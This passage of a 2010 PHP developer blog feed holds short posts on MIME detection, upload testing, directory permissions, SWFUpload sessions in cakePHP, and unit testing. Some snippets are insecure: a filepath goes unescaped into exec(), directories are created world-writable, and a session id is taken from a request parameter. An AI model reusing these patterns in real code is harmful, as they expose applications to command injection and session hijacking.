&lt;p&gt;And you use it like this :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;$finfo = finfo_open(FILEINFO_MIME);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;$mimeType = finfo_file($finfo, $filepath);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;finfo_close($finfo);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Also note that the mimetype may be returned in a &lt;code&gt;text/plain; charset=us-
ascii&lt;/code&gt; form. You may need to parse the result to get it in the format you
need.&lt;/p&gt;

&lt;h2&gt;The getimagesize function&lt;/h2&gt;

&lt;p&gt;The &lt;a href=&quot;http://fr2.php.net/manual/en/function.getimagesize.php&quot;&gt;getimagesize&lt;/a&gt;
function can be called on any image file. It will return an array containing
image informations like &lt;code&gt;width&lt;/code&gt;, &lt;code&gt;height&lt;/code&gt;and of course the &lt;code&gt;mimetype&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Unfortunatly, it will cause a &lt;code&gt;E_WARNING&lt;/code&gt; if called on a non-image file. You
can&amp;#39;t even catch that using a &lt;code&gt;try/catch&lt;/code&gt;. You can suppress the error using
&lt;code&gt;@&lt;/code&gt;, tho.&lt;/p&gt;

&lt;p&gt;Here&amp;#39;s how I use it :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;$imageData = @getimagesize($filepath);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;if (!empty($imageData[&amp;#39;mime&amp;#39;])) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $mimeType = $imageData[&amp;#39;mime&amp;#39;];&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;Calling the system file&lt;/h2&gt;

&lt;p&gt;The last method I&amp;#39;m aware of is simply calling the &lt;code&gt;file&lt;/code&gt;command on a unix
system through &lt;code&gt;exec&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;$mimeType = exec(&amp;quot;/usr/bin/file -i -b $filepath&amp;quot;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Merging all that into one do-it-all method&lt;/p&gt;

&lt;p&gt;If you&amp;#39;re not sure what your system is capable of or if you plan on
distributing your code, you&amp;#39;d better test for all alternatives. Here&amp;#39;s the
code I&amp;#39;m using :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;/**&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;*Â Â Â  mimetype&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;*Â Â Â  Returns a file mimetype. Note that it is a true mimetype fetch, using php and OS methods. It will NOT&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;*Â Â Â  revert to a guessed mimetype based on the file extension if it can&amp;#39;t find the type.&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;*Â Â Â  In that case, it will return false&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;**/&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;function mimetype($filepath) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt; // Check only existing files&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt; if (!file_exists($filepath) || !is_readable($filepath)) return false;&lt;/span&gt;

&lt;span class=&quot;x&quot;&gt; // Trying finfo&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt; if (function_exists(&amp;#39;finfo_open&amp;#39;)) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;   $finfo = finfo_open(FILEINFO_MIME);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;   $mimeType = finfo_file($finfo, $filepath);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;   finfo_close($finfo);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;   // Mimetype can come in text/plain; charset=us-ascii form&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;   if (strpos($mimeType, &amp;#39;;&amp;#39;)) list($mimeType,) = explode(&amp;#39;;&amp;#39;, $mimeType);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;   return $mimeType;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt; }&lt;/span&gt;

&lt;span class=&quot;x&quot;&gt; // Trying mime_content_type&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt; if (function_exists(&amp;#39;mime_content_type&amp;#39;)) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;   return mime_content_type($filepath);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt; }&lt;/span&gt;

&lt;span class=&quot;x&quot;&gt; // Trying exec&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt; if (function_exists(&amp;#39;exec&amp;#39;)) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;   $mimeType = exec(&amp;quot;/usr/bin/file -i -b $filepath&amp;quot;);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;   if (!empty($mimeType)) return $mimeType;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt; }&lt;/span&gt;

&lt;span class=&quot;x&quot;&gt; // Trying to get mimetype from images&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt; $imageData = @getimagesize($filepath);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt; if (!empty($imageData[&amp;#39;mime&amp;#39;])) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;   return $imageData[&amp;#39;mime&amp;#39;];&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt; }&lt;/span&gt;

&lt;span class=&quot;x&quot;&gt; return false;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Hope that helps !&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>One thing that may turn me to Ruby : LESS</title>
   <link href="http://blog.pixelastic.com/2010/08/05/one-thing-that-may-turn-me-to-ruby-less/"/>
   <updated>2010-08-05T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/08/05/one-thing-that-may-turn-me-to-ruby-less</id>
   <content type="html">&lt;p&gt;I often hear how Ruby is better than PHP, that cakePHP is only a port of the
Ruby on Rail framework and that the original is much more powerful.&lt;/p&gt;

&lt;p&gt;Well, I&amp;#39;ve been tempted to try and learn Ruby for some quite time now. But
I&amp;#39;ve been a little scared by the fact of having to learn a whole new language
when I&amp;#39;m now getting pretty good with cake.&lt;/p&gt;

&lt;p&gt;That and the shortage of hosts with a support for Ruby out there keep me away
from it.&lt;/p&gt;

&lt;h2&gt;LESS, a Ruby only little gem&lt;/h2&gt;

&lt;p&gt;But one thing that may change my mind is &lt;a href=&quot;http://lesscss.org/&quot;&gt;LESS&lt;/a&gt;, the CSS
as it should have been written since day one. It allows, in an extremely
simple syntax, to define variables, functions, nested definitions, easier
selectors.&lt;/p&gt;

&lt;p&gt;Unfortunatly, the parser only exists as a Ruby gem, too bad for my php apps.&lt;/p&gt;

&lt;h2&gt;Why I don&amp;#39;t use the javascript version&lt;/h2&gt;

&lt;p&gt;There is &lt;a href=&quot;http://fadeyev.net/2010/06/19/lessjs-will-%0Aobsolete-css/&quot;&gt;Javascript version&lt;/a&gt; of the parser, but I don&amp;#39;t like the idea of having CSS
rendering based on script execution. It means that if I&amp;#39;m browsing without
scripts enabled, I won&amp;#39;t have any styling.&lt;/p&gt;

&lt;p&gt;Styling and Scripting are two very different things, one should work without
the other and &lt;em&gt;vice versa&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;So maybe, when the syntax will be parsed directly by browsers (one could
dream...), or if a PHP parser is released I&amp;#39;ll try it right away, but until
them, I&amp;#39;ll stick with my rusty CSS.&lt;/p&gt;

&lt;h2&gt;LESS in PHP ?&lt;/h2&gt;

&lt;p&gt;&lt;em&gt;Well, some hours after posting this I just stumbled upon
&lt;a href=&quot;http://leafo.net/lessphp/&quot;&gt;that&lt;/a&gt;. I guess I&amp;#39;ll try LESS in php world after
all !&lt;/em&gt;&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Testing file uploads in PHP</title>
   <link href="http://blog.pixelastic.com/2010/08/04/testing-file-uploads-in-php/"/>
   <updated>2010-08-04T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/08/04/testing-file-uploads-in-php</id>
   <content type="html">&lt;p&gt;I just had to write unit tests for a file upload script I had to write. As it
is not &lt;a href=&quot;http://stackoverflow.com/questions/3402765/how-can-i-write-%0Atests-for-file-upload-in-php/3410684#3410684&quot;&gt;that easy&lt;/a&gt; &lt;a href=&quot;http://www.foonews.info%0A/fr-comp-lang-php/10256260-tests-unitaires-formulaire-dupload-de-%0Afichier.html&quot;&gt;to do&lt;/a&gt;, I&amp;#39;ll share my findings with you.&lt;/p&gt;

&lt;p&gt;My problem was on how I was going to simulate a file upload in a test case.
Sure I could simulate a whole post request either using curl of simpleTest
webtester. But that would only give me a full overview of the upload process,
not its inner details.&lt;/p&gt;

&lt;p&gt;There was &lt;a href=&quot;http://www.mail-%0Aarchive.com/internals@lists.php.net/msg35782.html&quot;&gt;a way to do that&lt;/a&gt; using
&lt;a href=&quot;http://qa.php.net/phpt_details.php#post_raw_section&quot;&gt;PHPT&lt;/a&gt;, which seems to be
the unit tests used by PHP itself. It is supposed to simulate any kind of
query. Unfortunatly, setting that up seemed a little to complex for me.&lt;/p&gt;

&lt;h2&gt;So, how did I do ?&lt;/h2&gt;

&lt;p&gt;I finally found a way to do that by :&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Spoofing the &lt;code&gt;$_FILES&lt;/code&gt; array and putting arbitrary test data inside&lt;/li&gt;
&lt;li&gt;Copying a test file to the &lt;code&gt;tmp/&lt;/code&gt; directory for testing purpose. Actually the directory does not matter (see 3.)&lt;/li&gt;
&lt;li&gt;Wrapping all calls to &lt;code&gt;move_uploaded_file&lt;/code&gt; and &lt;code&gt;is_uploaded_file&lt;/code&gt; to its own methods. Those two php methods won&amp;#39;t work with dummy upload because they weren&amp;#39;t really uploaded through &lt;code&gt;POST&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;So, instead of calling &lt;code&gt;move_uploaded_file&lt;/code&gt;, I called
&lt;code&gt;$this-&amp;gt;moveUploadedFile()&lt;/code&gt;, and instead of calling &lt;code&gt;is_uploaded_file()&lt;/code&gt;, I
called &lt;code&gt;$this-&amp;gt;isUploadedFile()&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;And when times comes to test my class, I just extends the class, overwrite
those two methods with new one that uses &lt;code&gt;rename()&lt;/code&gt;and &lt;code&gt;file_exists()&lt;/code&gt;
instead.`&lt;/p&gt;

&lt;p&gt;`&lt;/p&gt;

&lt;h2&gt;What does that change ?&lt;/h2&gt;

&lt;p&gt;The fondamental difference between the former and the latter functions is that
the former checks that the target really was uploaded through POST while the
latter does not care.&lt;/p&gt;

&lt;p&gt;It is extremely important that you use the correct upload method because it
provide an additional security check. If you just blindly &lt;code&gt;rename()&lt;/code&gt; files
specified by your user, you&amp;#39;ll ending up putting the &lt;code&gt;database.php&lt;/code&gt; and
&lt;code&gt;config.php&lt;/code&gt; files in the webroot renamed as &lt;code&gt;i_want_to_be_hacked.txt&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;The other good news is that by wrapping those methods around those functions,
you can create mock objects and test all the various return scenarios.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Disabling PHP scripts in a directory</title>
   <link href="http://blog.pixelastic.com/2010/08/04/disabling-php-script-in-a-directory/"/>
   <updated>2010-08-04T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/08/04/disabling-php-script-in-a-directory</id>
   <content type="html">&lt;p&gt;Say you want to disable PHP scripts in a whole directory. Like your &lt;code&gt;upload/&lt;/code&gt;
directory, because you don&amp;#39;t want your users to upload &lt;code&gt;.php&lt;/code&gt; files with
direct webroot access on your server...&lt;/p&gt;

&lt;p&gt;Just drop a &lt;code&gt;.htaccess&lt;/code&gt; file in it, and add the following rules&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-apache&quot; data-lang=&quot;apache&quot;&gt;&lt;span class=&quot;c&quot;&gt;# We don&amp;#39;t want php files from being parsed by the server in this directory, so we will return them as plain text&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;AddType&lt;/span&gt; text/plain .php .php3 .php4 .php5 .php6 .phtml

&lt;span class=&quot;c&quot;&gt;# Or, if the first rule does not work on your server, you may want to completely turn off PHP&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#php_flag engine off&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
 </entry>
 
 <entry>
   <title>Creating dirs with correct chmod in PHP</title>
   <link href="http://blog.pixelastic.com/2010/08/04/creating-dirs-with-correct-chmod-in-php/"/>
   <updated>2010-08-04T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/08/04/creating-dirs-with-correct-chmod-in-php</id>
   <content type="html">&lt;p&gt;One trick I&amp;#39;ve been dragging with me on all this years of PHP programing is a
little snippet to correctly create directories with the chmod I want.&lt;/p&gt;

&lt;p&gt;By simply calling &lt;code&gt;mkdir(&amp;#39;my_dir&amp;#39;, 0777)&lt;/code&gt; I used to often end up with
directories that I can&amp;#39;t write to nor delete, even if I was correctly setting
the chmod.&lt;/p&gt;

&lt;p&gt;The trick was to reset the mask (using &lt;code&gt;umask(0)&lt;/code&gt;) before the &lt;code&gt;mkdir()&lt;/code&gt;call
and then reapplying the old mask after.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;$tmpUmask = umask(0);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;mkdir(&amp;#39;my_dir&amp;#39;, 0777);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;umask($tmpUmask);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;I must admit that I&amp;#39;ve never really understand why it was working better than
simply calling &lt;code&gt;mkdir()&lt;/code&gt; but hey, it&amp;#39;s been years that I&amp;#39;m using that now and
I never run into access rights issues since.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Calling a parent method with arguments in PHP</title>
   <link href="http://blog.pixelastic.com/2010/08/04/calling-a-parent-method-with-arguments-in-php/"/>
   <updated>2010-08-04T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/08/04/calling-a-parent-method-with-arguments-in-php</id>
   <content type="html">&lt;p&gt;For testing purpose I just needed to overwrite an existing class to add some
more logic to some methods before returning a call to its parent method.&lt;/p&gt;

&lt;p&gt;I needed to do that in a test case to save in an inner variable the result so
I can clean up my mess after each test ran.&lt;/p&gt;

&lt;p&gt;The key is calling &lt;code&gt;call_user_func_array&lt;/code&gt; with the right syntax. It seems that
some version of PHP prior to 5.3 choke (like in segmentation fault) if an
alternate syntax is given.&lt;/p&gt;

&lt;p&gt;Here is what worked for me :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;class TestDocument extends Document {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;Â Â Â  function foo() {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;Â Â Â  Â Â Â  return $this-&amp;gt;fooResult= call_user_func_array(array(&amp;#39;parent&amp;#39;, &amp;#39;foo&amp;#39;), func_get_args());&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;Â Â Â  }&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
 </entry>
 
 <entry>
   <title>SWFUpload and cakePHP</title>
   <link href="http://blog.pixelastic.com/2010/08/03/swfupload-and-cakephp/"/>
   <updated>2010-08-03T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/08/03/swfupload-and-cakephp</id>
   <content type="html">&lt;p&gt;One thing that always sent me an awful hours of debugging is the fact that the
Flash player identify itself as a whole different browser that the one it is
integrated into.&lt;/p&gt;

&lt;p&gt;I&amp;#39;ve ran into this issue multiple times when dealing with SWFUpload and today
was one more. As I always spent quite a lot of time debugging issues arising
from this, I guess I should post about it here.&lt;/p&gt;

&lt;h2&gt;The Flash player uses a different userAgent that your browser&lt;/h2&gt;

&lt;p&gt;Most of the time, this is not a problem. But when dealing with restricted
areas of a website built on top of cakePHP, it can become one.&lt;/p&gt;

&lt;p&gt;The thing is that as the &lt;code&gt;userAgent&lt;/code&gt;string used by the Flash player is not
the same as the one used by your browser. So, when you make a request to your
site, cake will see that as whole new request and you won&amp;#39;t be able to access
your current session variables.&lt;/p&gt;

&lt;p&gt;As you can&amp;#39;t overwrite the &lt;code&gt;userAgent&lt;/code&gt;hash sent, you need to send the
&lt;code&gt;sessionId&lt;/code&gt;along with your flash request. That way, you&amp;#39;ll be able to call a&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;$this-&amp;gt;Session-&amp;gt;id($sessionId);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;$this-&amp;gt;Session-&amp;gt;start();&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;in your controller &lt;code&gt;beforeFilter&lt;/code&gt;(or component &lt;code&gt;initialize&lt;/code&gt;)&lt;/p&gt;

&lt;p&gt;&lt;em&gt;In cake 1.2, you&amp;#39;ll also have to call &lt;code&gt;$this-&amp;gt;Session-&amp;gt;destroy()&lt;/code&gt; before to
delete the Flash session created.&lt;/em&gt;&lt;/p&gt;

&lt;h2&gt;The Flash player uses a different cookie pool that your browser&lt;/h2&gt;

&lt;p&gt;&lt;em&gt;This used to be an issue in 1.2 but not longer is.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Cake stores in a cookie the name of the session you&amp;#39;re supposed to use. Flash
having its own cookie pool, it will save its own cookie (usually somewhere you
don&amp;#39;t even know) and will always check for the session specified inside.&lt;/p&gt;

&lt;p&gt;This took me quite a long time to found out why the flash request where
reading an other request that the one I was setting.&lt;/p&gt;

&lt;p&gt;In 1.2, you needed to delete the cookie created by cake whenever you made a
flash request to avoid conflicts&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;setcookie(Configure::read(&amp;#39;Session.cookie&amp;#39;), &amp;#39;&amp;#39;, time() - 42000, $this-&amp;gt;Session-&amp;gt;path);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;cakePHP used to overwrite the userAgent string in session&lt;/h2&gt;

&lt;p&gt;In cake 1.2, when you manually change the current session, cake would update
the inner &lt;code&gt;userAgent&lt;/code&gt;hash saved to your current userAgent hash.&lt;/p&gt;

&lt;p&gt;This meant that whenever you were moving from the Flash session to the correct
session, you had to overwrite the &lt;code&gt;userAgent&lt;/code&gt;hash to the correct one.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;$this-&amp;gt;Session-&amp;gt;write(&amp;#39;Config.userAgent&amp;#39;, $userAgent);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;em&gt;This is no longer the case in 1.3, changing the current session does not
alter it anymore.&lt;/em&gt;&lt;/p&gt;

&lt;h2&gt;Doesn&amp;#39;t all that stuff alter security ?&lt;/h2&gt;

&lt;p&gt;Well, most of the answers I found online were among the lines of &amp;quot;Just disable
the check of the &lt;code&gt;userAgent&lt;/code&gt;&amp;quot;, so I think my method is a little bit more
secure.&lt;/p&gt;

&lt;p&gt;Anyway, passing a &lt;code&gt;sessionId&lt;/code&gt;as a parameter seems a little risky, even to me.
I guess there should be a way of encrypting it to not pass it as clear text&lt;/p&gt;

&lt;h2&gt;UPDATE !&lt;/h2&gt;

&lt;p&gt;I had to fiddle with this script some more. It appears that, as we are
changing the &lt;code&gt;sessionId&lt;/code&gt;, we need to do that BEFORE we access the session. It
means that any call to &lt;code&gt;Session::read()&lt;/code&gt; or &lt;code&gt;Session::check()&lt;/code&gt;, or almost any
other Session method BEFORE setting the id will block this trick from working.
So, make sure that this code is executed before anything else, put it in a
component that will be loaded first.&lt;/p&gt;

&lt;p&gt;It also appears that if you follow my advice, you&amp;#39;ll only have to call
&lt;code&gt;id($sessionId)&lt;/code&gt;, and none of the hocum pocum about &lt;code&gt;destroy&lt;/code&gt;, &lt;code&gt;write&lt;/code&gt;and
&lt;code&gt;userAgent&lt;/code&gt;hashes I talked about...&lt;/p&gt;

&lt;p&gt;I just lost some hours finding this out. I add a call to Session in my &lt;code&gt;I18n
&lt;/code&gt;component that was rendering this whole fix useless. It was driving me
crazy...&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Forcing joins in a cakePHP find</title>
   <link href="http://blog.pixelastic.com/2010/07/23/forcing-joins-in-a-cakephp-find/"/>
   <updated>2010-07-23T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/07/23/forcing-joins-in-a-cakephp-find</id>
   <content type="html">&lt;p&gt;Today I had to setup a complex find relation. Here is the simplifed version of
what I had :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;TABLE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timestamps&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;datetime&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;type&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user_id&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The type field only had two types of values : &lt;code&gt;START&lt;/code&gt;and &lt;code&gt;END&lt;/code&gt;. As you can
guess, this was used to log the time users where using an application. Every
time a user started using the app, a &lt;code&gt;START&lt;/code&gt; record was created, and when he
loggued out, an &lt;code&gt;END&lt;/code&gt;record was created. So basically, the records where
working as pairs.&lt;/p&gt;

&lt;p&gt;I wanted to get a list of all records that could be easily displayed. I wanted
to bind the timestamp model to itself, so that when querying all the start
records, I&amp;#39;ll automatically have the end ones as related models.&lt;/p&gt;

&lt;p&gt;Here&amp;#39;s how I did that :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;$this-&amp;gt;find(&amp;#39;all&amp;#39;, array(&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  &amp;#39;conditions&amp;#39; =&amp;gt; array(&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    &amp;#39;Timestamp.type&amp;#39; =&amp;gt; &amp;#39;START&amp;#39;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  ),&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  &amp;#39;joins&amp;#39; =&amp;gt; array(&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    array(&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;      &amp;#39;table&amp;#39; =&amp;gt; &amp;#39;timestamp&amp;#39;,&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;      &amp;#39;alias&amp;#39; =&amp;gt; &amp;#39;EndTimestamp&amp;#39;,&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;      &amp;#39;type&amp;#39; =&amp;gt; &amp;#39;LEFT&amp;#39;,&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;      &amp;#39;conditions&amp;#39; =&amp;gt; array(&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;        &amp;#39;EndTimestamp.type&amp;#39; =&amp;gt; &amp;#39;END&amp;#39;,&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;        &amp;#39;EndTimestamp.user_id = Timestamp.user_id&amp;#39;,&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;        &amp;#39;EndTimestamp.date &amp;gt; Timestamp.date&amp;#39;,&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;      )&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    )&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  ),&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  &amp;#39;order&amp;#39; =&amp;gt; array(&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    &amp;#39;Timestamp.date&amp;#39; =&amp;gt; &amp;#39;ASC&amp;#39;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  ),&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  &amp;#39;group&amp;#39; =&amp;gt; &amp;#39;Timestamp.date&amp;#39;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;));&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;It will fetch all the start timestamp (&lt;code&gt;fields&lt;/code&gt;) in chronological order
(&lt;code&gt;order&lt;/code&gt;). We will also define a custom join relation (&lt;code&gt;joins&lt;/code&gt;). We set the
table name and the alias we need, and set it as a &lt;code&gt;JOIN LEFT&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Then we add the conditions : we want only the &lt;code&gt;END&lt;/code&gt;records, that belongs to
the same user, and that occurs after the &lt;code&gt;START&lt;/code&gt;records. We also add a &lt;code&gt;group
&lt;/code&gt;key to make sure not to get twice the same result (or it will corrupt our
results)&lt;/p&gt;

&lt;p&gt;Note that the joins syntax needs to be wrapped in an unkeyed array. This is
because you may need to add several joins.&lt;/p&gt;

&lt;p&gt;I had never heard of this joins key before today, but it is quite handy, I
guess I&amp;#39;ll use it again.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Allow click through an HTML element</title>
   <link href="http://blog.pixelastic.com/2010/07/23/click-html-element/"/>
   <updated>2010-07-23T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/07/23/click-html-element</id>
   <content type="html">&lt;p&gt;When one HTML element is over another one (like when positioning an element
using &lt;code&gt;position:absolute&lt;/code&gt;), you usually can&amp;#39;t click through the top element to
access the bottom element.&lt;/p&gt;

&lt;p&gt;That&amp;#39;s used as a common technique to prevent the right click on images by some
sites (like Flickr). They just add an empty transparent div over their images
to prevent the lambda user from right clicking and saving the image.&lt;/p&gt;

&lt;p&gt;Sometimes, when integrating complex designs, you need those additional layers,
but you also want the user to be able to click through them, as if they
weren&amp;#39;t there.&lt;/p&gt;

&lt;p&gt;Just use the &lt;code&gt;pointer-events:none&lt;/code&gt; css property to allow click events to go
through the element.&lt;/p&gt;

&lt;p&gt;This is only supported by Firefox 3.6+, Chrome and Safari for now.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Beginner's introduction to Unit Testing and TDD</title>
   <link href="http://blog.pixelastic.com/2010/07/23/beginner-s-introduction-to-unit-testing-and-tdd/"/>
   <updated>2010-07-23T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/07/23/beginner-s-introduction-to-unit-testing-and-tdd</id>
   <content type="html">&lt;p&gt;I first heard of TDD and Unit Testing one year ago, by reading discussions
about cakePHP. Cake was boasting about its complete testing.&lt;/p&gt;

&lt;p&gt;Back in these days I only had a vague understanding of what that meant. I
guessed it was a way to prove that the code you wrote did not have any bug, or
if it had, you could find them easily and make sure that you did not break
existing code with a new release.&lt;/p&gt;

&lt;p&gt;That sounded exciting and I tried to write some tests for my own app. I gave
up really quickly as I found that you need both a good understanding of the
inner workings of cake and some familiarity with testing before being able to
write tests.&lt;/p&gt;

&lt;p&gt;Some weeks ago, I decided to gave it another try. This time I started by
reading more general concepts about the whole testing thing before writing
anything. That&amp;#39;s how I learned that Unit Testing and TDD are two different
thing, the former leading to the latter.&lt;/p&gt;

&lt;h2&gt;So, what exactly is Unit Testing ?&lt;/h2&gt;

&lt;p&gt;A Unit Test is a simple test (function) you write that will test that one tiny
little part of your whole application is doing what it is supposed to do. Most
of the time, you&amp;#39;ll end up testing one particular method of one particular
class. You pass a specified input parameter to you function, and you test that
the returned value is the one you were expecting.&lt;/p&gt;

&lt;p&gt;Unit Testing is &lt;em&gt;just&lt;/em&gt; that : writing automated tests for methods you wrote.
